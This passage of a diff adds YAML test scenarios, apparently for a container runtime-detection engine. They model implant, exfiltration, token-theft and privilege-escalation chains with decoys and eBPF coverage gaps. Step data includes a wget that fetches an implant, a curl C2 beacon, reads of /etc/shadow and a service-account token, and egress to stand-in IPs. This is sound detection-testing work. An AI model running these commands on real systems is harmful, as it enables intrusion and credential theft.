+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 8]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant, which scans, descends from the writer"
+      - from: 3
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant's child shell makes the connection"
+      - from: 1
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the connecting shell descends from the writer"
+      - from: 6
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the reload helper, a sibling of the implant's parent in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 8
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [8, 10]
+        reason: "decoy: the reload helper, a sibling of the downloader in the same Pod, connects out again; it does not descend from the implant"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 15
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the log shipper, a sibling of the downloader in the same Pod, made a file executable"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 14
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the reloader connects out twice, one benign process"
+        ordering: false
+      - from: 16
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the reloader connects out twice, one benign process"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: false
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.file_path
+            value: /tmp/.X11-unix/agent
+          - field: step.2.params.file_path
+            value: /tmp/.X11-unix/agent
+          - field: step.3.params.executable
+            value: /tmp/.X11-unix/agent
+          - field: step.8.params.remote_port
+            value: 53
+      - id: v3
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.file_path
+            value: /dev/shm/.k
+          - field: step.2.params.file_path
+            value: /dev/shm/.k
+          - field: step.3.params.executable
+            value: /dev/shm/.k
+          - field: step.6.params.target_port
+            value: 6443
+          - field: step.8.params.remote_ip
+            value: 203.0.113.140
+          - field: step.8.params.remote_port
+            value: 4443
+          - field: step.10.params.remote_ip
+            value: 203.0.113.161
+
+  - id: chain_implant_scan_c2_unobserved
+    kind: degraded
+    title: "Chain degraded: implant chain with the implant's exec lost in an eBPF gap"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "eBPF probe gap when the implant starts"
+    author: "claude (multistep-chain-plan phase 2b, 2026-10-20)"
+    adaptation_note: "chain_implant_scan_c2 with step 3 unobserved: the implant's fork and exec are lost, so the writer-to-implant link cannot be confirmed."
+    window_s: 45            # linked steps within W_w (60 s) with gap_of's x1.25 (D-22)
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+      - name: target_pod_1
+        kind: internal_pod
+      - name: target_pod_2
+        kind: internal_pod
+    steps:
+      - step: 0
+        action: process_exec
+        params:
+          parent_process: compromised_pod
+          executable: /usr/bin/wget
+          argv: [wget, -q, -O, /var/lib/.cache/implant, "https://203.0.113.99/i"]
+        outcome: success
+      - step: 1
+        action: file_write
+        params:
+          writer_process: "@step0.process"
+          file_path: /var/lib/.cache/implant
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects: []
+      - step: 2
+        action: make_executable
+        params:
+          process: "@step0.process"
+          file_path: /var/lib/.cache/implant
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "File made executable post-start"
+      - step: 3
+        action: process_exec
+        unobserved:
+          - ebpf
+        params:
+          parent_process: "@step0.process"
+          executable: /var/lib/.cache/implant
+          argv: [/var/lib/.cache/implant]
+        outcome: success
+      - step: 4
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/server-reload
+          argv: [/app/server-reload]
+        outcome: success
+      - step: 5
+        action: connect_internal
+        params:
+          source_pod: compromised_pod
+          source_process: "@step3.process"
+          target_service_or_pod: target_pod_1
+          target_port: 22
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: G1a
+            state: PRESENT
+            reason: "Connection outside baseline edges"
+      - step: 6
+        action: connect_internal
+        params:
+          source_pod: compromised_pod
+          source_process: "@step3.process"
+          target_service_or_pod: target_pod_2
+          target_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: G1a
+            state: PRESENT
+      - step: 7
+        action: file_write
+        benign: true
+        float: decoy
+        params:
+          writer_process: "@step12.process"
+          file_path: /app/bin/log-shipper.new
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects: []
+      - step: 15
+        action: make_executable
+        benign: true
+        float: decoy
+        params:
+          process: "@step12.process"
+          file_path: /app/bin/log-shipper.new
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "The log shipper makes its update executable after start, outside the expected writers: a real lookalike, not part of the chain"
+      - step: 8
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step3.process"
+          remote_ip: 203.0.113.99
+          remote_port: 8443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 9
+        action: process_exec
+        float: beacon
+        params:
+          parent_process: "@step3.process"
+          executable: /bin/sh
+          argv: [sh, -c, "curl -s https://192.0.2.140/ping"]
+        outcome: success
+      - step: 10
+        action: connect_external
+        float: beacon
+        params:
+          source_pod: compromised_pod
+          source_process: "@step9.process"
+          remote_ip: 192.0.2.140
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "C2 beacon to a destination new to the workload"
+      - step: 12
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/log-shipper
+          argv: [/app/log-shipper]
+        outcome: success
+      - step: 14
+        action: connect_external
+        benign: true
+        float: decoy_conn
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 203.0.113.150
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "The reload helper fetches from a destination new to the workload: a real unseen destination, not part of the chain"
+      - step: 16
+        action: connect_external
+        benign: true
+        float: decoy_conn2
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 203.0.113.152
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "The reload helper fetches again from a destination new to the workload: a real unseen destination, not part of the chain"
+    links:
+      - from: 2
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant's fork and exec are lost in an eBPF gap"
+      - from: 2
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant's fork and exec are lost in an eBPF gap"
+      - from: 2
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant's fork and exec are lost in an eBPF gap"
+      - from: 5
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant's child shell makes the beacon connection"
+      - from: 2
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant's fork and exec are lost in an eBPF gap"
+      - from: 5
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the implant scans a second Pod"
+      - from: 6
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the implant calls out"
+      - from: 6
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant's child shell makes the beacon connection"
+      - from: 8
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant's child shell makes the beacon connection"
+      - from: 2
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the reload helper, a sibling of the downloader in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 5
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [5, 10]
+        reason: "decoy: the reload helper, a sibling of the implant's parent in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 15
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        gap_of: [2, 5]
+        reason: "decoy: with the implant's fork and exec lost, ancestry can be neither shown nor ruled out"
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant's fork and exec are lost in an eBPF gap"
+      - from: 1
+        to: 2
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the writer makes the file executable"
+      - from: 3
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant's fork and exec are lost in an eBPF gap"
+      - from: 5
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the implant calls out"
+      - from: 1
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant's lineage fork and exec are lost, so its process cannot be traced"
+      - from: 4
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        gap_of: [3, 10]
+        reason: "decoy: with the implant's fork and exec lost, ancestry can be neither shown nor ruled out"
+      - from: 7
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        gap_of: [1, 8]
+        reason: "decoy: with the implant's fork and exec lost, ancestry can be neither shown nor ruled out"
+      - from: 1
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant, which scans, descends from the writer; the implant's exec is lost in an eBPF gap"
+      - from: 3
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the implant's child shell makes the connection; the implant's exec is lost in an eBPF gap"
+      - from: 1
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the connecting shell descends from the writer; the implant's exec is lost in an eBPF gap"
+      - from: 6
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the reload helper, a sibling of the implant's parent in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 8
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [8, 10]
+        reason: "decoy: the reload helper, a sibling of the downloader in the same Pod, connects out again; it does not descend from the implant"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 15
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "decoy: with the implant's fork and exec lost, ancestry can be neither shown nor ruled out"
+      - from: 14
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the reloader connects out twice, one benign process"
+        ordering: false
+      - from: 16
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the reloader connects out twice, one benign process"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: false
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.file_path
+            value: /tmp/.X11-unix/agent
+          - field: step.2.params.file_path
+            value: /tmp/.X11-unix/agent
+          - field: step.3.params.executable
+            value: /tmp/.X11-unix/agent
+          - field: step.8.params.remote_port
+            value: 53
+      - id: v3
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.file_path
+            value: /dev/shm/.k
+          - field: step.2.params.file_path
+            value: /dev/shm/.k
+          - field: step.3.params.executable
+            value: /dev/shm/.k
+          - field: step.6.params.target_port
+            value: 6443
+          - field: step.8.params.remote_ip
+            value: 203.0.113.140
+          - field: step.8.params.remote_port
+            value: 4443
+          - field: step.10.params.remote_ip
+            value: 203.0.113.161
+
+  - id: chain_exfil_first
+    kind: attack
+    title: "Chain: exfiltration first, then token theft and privilege escalation"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: "T1041 Exfiltration Over C2 Channel; T1528 Steal Application Access Token; T1068 Exploitation for Privilege Escalation"
+        url: "https://attack.mitre.org/matrices/enterprise/containers/"
+    author: "claude (exp2-gaps-plan B4, 2026-10-22)"
+    adaptation_note: "A stager exfiltrates first (H4), then its child steals the token (D1) and escalates (F1): tactic transitions run backwards along the ATT&CK order, H2 steps carry no tactic, and several paths compete for the escalation. A sibling decoy repeats H2, D1 and F1."
+    window_s: 45            # linked steps within W_w (60 s), D-22
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: process_exec
+        params:
+          parent_process: compromised_pod
+          executable: /tmp/.s/stage
+          argv: [/tmp/.s/stage]
+        outcome: success
+        expects: []
+      - step: 2
+        action: read_sensitive_file
+        params:
+          reader_process: "@step1.process"
+          file_path: /etc/shadow
+          data_class: system
+        outcome: success
+        expects: []          # the read is part of the later H4 opportunity
+      - step: 3
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step1.process"
+          remote_ip: 198.51.100.77
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 4
+        action: egress_transfer
+        intended_tactic: EXFILTRATION
+        params:
+          source_pod: compromised_pod
+          source_process: "@step1.process"
+          destination: 198.51.100.77
+          bytes_out: 4096
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H4
+            state: PRESENT
+            reason: "Sensitive read, external connect and bytes out in one lineage"
+      - step: 5
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /usr/local/bin/kubectl
+          argv: [kubectl, get, pods]
+        outcome: success
+        expects: []
+      - step: 6
+        action: read_token_file
+        intended_tactic: CREDENTIAL_ACCESS
+        params:
+          reader_process: "@step5.process"
+          reader_executable: /usr/local/bin/kubectl
+          token_file_path: /var/run/secrets/kubernetes.io/serviceaccount/token
+        outcome: success
+        expects:
+          - finding: D1
+            state: PRESENT
+            reason: "Token read by an executable outside the workload's expected readers"
+      - step: 7
+        action: euid_to_root
+        intended_tactic: PRIVILEGE_ESCALATION
+        params:
+          process: "@step5.process"
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "euid transitions from non-zero to 0 after the token theft"
+      - step: 8
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step5.process"
+          remote_ip: 203.0.113.171
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 9
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/metrics-push
+          argv: [/app/metrics-push]
+        outcome: success
+        expects: []
+      - step: 10
+        action: connect_external
+        benign: true
+        float: decoy
+        params:
+          source_pod: compromised_pod
+          source_process: "@step9.process"
+          remote_ip: 198.51.100.83
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "The metrics pusher connects to a destination new to the workload: a real unseen destination, not part of the chain"
+      - step: 13
+        action: read_token_file
+        benign: true
+        float: decoy
+        params:
+          reader_process: "@step9.process"
+          reader_executable: /app/metrics-push
+          token_file_path: /var/run/secrets/kubernetes.io/serviceaccount/token
+        outcome: success
+        expects:
+          - finding: D1
+            state: PRESENT
+            reason: "The metrics pusher reads the token outside the expected readers: a real lookalike, not part of the chain"
+      - step: 14
+        action: euid_to_root
+        benign: true
+        float: decoy
+        params:
+          process: "@step9.process"
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "The metrics pusher's setuid helper runs as root outside the expected transitions: a real lookalike, not part of the chain"
+    links:
+      - from: 3
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the stager's connect carries the exfiltration"
+      - from: 4
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the token reader is a child of the stager that exfiltrated"
+      - from: 3
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the token reader is a child of the stager that connected out"
+      - from: 4
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the escalating process is a child of the stager that exfiltrated"
+      - from: 3
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the escalating process is a child of the stager that connected out"
+      - from: 6
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the token reader escalates"
+      - from: 6
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the token reader connects out"
+      - from: 4
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the connecting process is a child of the stager that exfiltrated"
+      - from: 3
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the connecting process is a child of the stager that connected out"
+      - from: 4
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [4, 8]
+        reason: "decoy: the metrics pusher, a sibling of the stager in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 4
+        to: 13
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [4, 6]
+        reason: "decoy: the metrics pusher, a sibling of the stager, reads the token"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 13
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the metrics pusher, a sibling of the stager, reads the token"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 4
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [4, 7]
+        reason: "decoy: the metrics pusher, a sibling of the stager, gains root"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the metrics pusher, a sibling of the stager, gains root"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the metrics pusher, a sibling of the stager in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 7
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: kubectl, root after the escalation, connects out"
+        ordering: false
+      - from: 13
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 14
+        to: 13
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 13
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 10
+        to: 13
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 14
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 10
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: chain_exfil_first_unobserved
+    kind: degraded
+    title: "Chain degraded: exfiltration first, then token theft and privilege escalation, with the child process exec lost"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "eBPF probe gap when the child starts"
+    author: "claude (exp2-gaps-plan B4, 2026-10-22)"
+    adaptation_note: "A stager exfiltrates first (H4), then its child steals the token (D1) and escalates (F1): tactic transitions run backwards along the ATT&CK order, H2 steps carry no tactic, and several paths compete for the escalation. A sibling decoy repeats H2, D1 and F1. The child's exec is lost, so links into its chain are unobservable."
+    window_s: 45            # linked steps within W_w (60 s), D-22
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: process_exec
+        params:
+          parent_process: compromised_pod
+          executable: /tmp/.s/stage
+          argv: [/tmp/.s/stage]
+        outcome: success
+        expects: []
+      - step: 2
+        action: read_sensitive_file
+        params:
+          reader_process: "@step1.process"
+          file_path: /etc/shadow
+          data_class: system
+        outcome: success
+        expects: []          # the read is part of the later H4 opportunity
+      - step: 3
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step1.process"
+          remote_ip: 198.51.100.77
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 4
+        action: egress_transfer
+        intended_tactic: EXFILTRATION
+        params:
+          source_pod: compromised_pod
+          source_process: "@step1.process"
+          destination: 198.51.100.77
+          bytes_out: 4096
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H4
+            state: PRESENT
+            reason: "Sensitive read, external connect and bytes out in one lineage"
+      - step: 5
+        action: process_exec
+        unobserved:
+          - ebpf
+        params:
+          parent_process: "@step1.process"
+          executable: /usr/local/bin/kubectl
+          argv: [kubectl, get, pods]
+        outcome: success
+        expects: []
+      - step: 6
+        action: read_token_file
+        intended_tactic: CREDENTIAL_ACCESS
+        params:
+          reader_process: "@step5.process"
+          reader_executable: /usr/local/bin/kubectl
+          token_file_path: /var/run/secrets/kubernetes.io/serviceaccount/token
+        outcome: success
+        expects:
+          - finding: D1
+            state: PRESENT
+            reason: "Token read by an executable outside the workload's expected readers"
+      - step: 7
+        action: euid_to_root
+        intended_tactic: PRIVILEGE_ESCALATION
+        params:
+          process: "@step5.process"
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "euid transitions from non-zero to 0 after the token theft"
+      - step: 8
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step5.process"
+          remote_ip: 203.0.113.171
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 9
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/metrics-push
+          argv: [/app/metrics-push]
+        outcome: success
+        expects: []
+      - step: 10
+        action: connect_external
+        benign: true
+        float: decoy
+        params:
+          source_pod: compromised_pod
+          source_process: "@step9.process"
+          remote_ip: 198.51.100.83
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "The metrics pusher connects to a destination new to the workload: a real unseen destination, not part of the chain"
+      - step: 13
+        action: read_token_file
+        benign: true
+        float: decoy
+        params:
+          reader_process: "@step9.process"
+          reader_executable: /app/metrics-push
+          token_file_path: /var/run/secrets/kubernetes.io/serviceaccount/token
+        outcome: success
+        expects:
+          - finding: D1
+            state: PRESENT
+            reason: "The metrics pusher reads the token outside the expected readers: a real lookalike, not part of the chain"
+      - step: 14
+        action: euid_to_root
+        benign: true
+        float: decoy
+        params:
+          process: "@step9.process"
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "The metrics pusher's setuid helper runs as root outside the expected transitions: a real lookalike, not part of the chain"
+    links:
+      - from: 3
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the stager's connect carries the exfiltration"
+      - from: 4
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the child's exec is lost in an eBPF gap"
+      - from: 3
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the child's exec is lost in an eBPF gap"
+      - from: 4
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the child's exec is lost in an eBPF gap"
+      - from: 3
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the child's exec is lost in an eBPF gap"
+      - from: 6
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the token reader escalates"
+      - from: 6
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the token reader connects out"
+      - from: 4
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the child's exec is lost in an eBPF gap"
+      - from: 3
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the child's exec is lost in an eBPF gap"
+      - from: 4
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [4, 8]
+        reason: "decoy: the metrics pusher, a sibling of the stager in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 4
+        to: 13
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [4, 6]
+        reason: "decoy: the metrics pusher, a sibling of the stager, reads the token"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 13
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the metrics pusher, a sibling of the stager, reads the token"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 4
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [4, 7]
+        reason: "decoy: the metrics pusher, a sibling of the stager, gains root"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the metrics pusher, a sibling of the stager, gains root"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the metrics pusher, a sibling of the stager in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 7
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: kubectl, root after the escalation, connects out"
+        ordering: false
+      - from: 13
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 14
+        to: 13
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 13
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 10
+        to: 13
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 14
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+      - from: 10
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the metrics pusher reads the token, gains root and connects out, one benign process"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: false
